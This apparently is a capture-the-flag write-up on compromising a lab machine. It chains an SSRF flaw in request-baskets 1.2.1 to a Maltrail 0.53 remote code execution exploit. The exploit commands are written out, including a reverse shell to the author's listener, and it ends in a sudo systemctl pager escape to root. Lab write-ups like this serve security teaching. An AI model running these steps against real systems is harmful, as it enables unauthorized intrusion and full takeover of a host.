I performed an aggressive port scan against the two TCP ports using the command sudo nmap -sV -A 10.129.229.26 -p 22,55555 and obtained the result shown above. From this scan, it looks like there is an HTTP application on the higher port 55555. I will begin enumeration with this port first.

Enumeration

Port 55555: HTTP

The webpage above is displayed to me for this web application. Right away I notice the application is powered by request-baskets 1.2.1. Is the framework used by the web application vulnerable? Time to find out.


I did a Google search for request-baskets 1.2.1 and obtained the result shown above. By the looks of it, the framework is vulnerable to server-side request forgery (SSRF). This vulnerability has the CVE id of CVE-2023-27163.


More information about this vulnerability is shown above. I found this information at https://medium.com/@li_allouche/request-baskets-1-2-1-server-side-request-forgery-cve-2023-27163-2bab94f201f7. I need to find a working exploit for this vulnerability first.

Exploitation


I found a public exploit for this vulnerability, as shown above. I downloaded a copy of the exploit on my machine and renamed the file to exp.sh. I also changed the permission of the file to be executable using chmod +x. I notice the usage for this exploit is ./exploit.sh <target_url> <attacker_url>. Time to test it.


In the main webpage, I clicked on the gear icon and changed the settings to the one shown above. I changed the Forward URL to http://127.0.0.1, as there is another filtered HTTP application on the target machine. I also ticked the Proxy Response and Expand Forward Path settings, as shown above. Maybe I can access the HTTP application on port 80 now?


To run the exploit, I used the command ./exploit.sh http://10.129.229.26:55555/cuxfhld http://10.129.229.26:80 and got the result shown above. I successfully managed to use SSRF to access the web application on port 80. By the looks of it, the target machine is running the application Maltrail 0.53 on this port. From previous knowledge, I know this application version is vulnerable to RCE.


I found the exploit for Maltrail 0.53 at https://packetstormsecurity.com/files/174129/Maltrail-0.53-Remote-Code-Execution.html, as shown above. This exploit seems to target the /login. I downloaded a copy of the exploit on my machine and renamed it to rce.py. I also made it executable. This exploit also contains the usage format which is helpful.


And I successfully managed to obtain a foothold on the target machine with the session as puma, as shown above. To achieve this, I started a listener on my machine at port 8444. Then I used the command python3 rce.py 10.10.14.91 8444 http://10.129.229.26:55555/cuxfhld to run the exploit.

Privilege Escalation


Running the command sudo -l shows the interesting entry above. It looks like the user puma can run the application /usr/bin/systemctl. This user can run the command status on the file trail.service as the user root.


I browsed to GTFObins and saw the entry shown above.


To obtain a root shell, I executed the command sudo /usr/bin/systemctl status trail.service first. Then I spawned a shell using the command !/bin/sh, and bingo! Now I have root privileges on the target machine as shown above :)
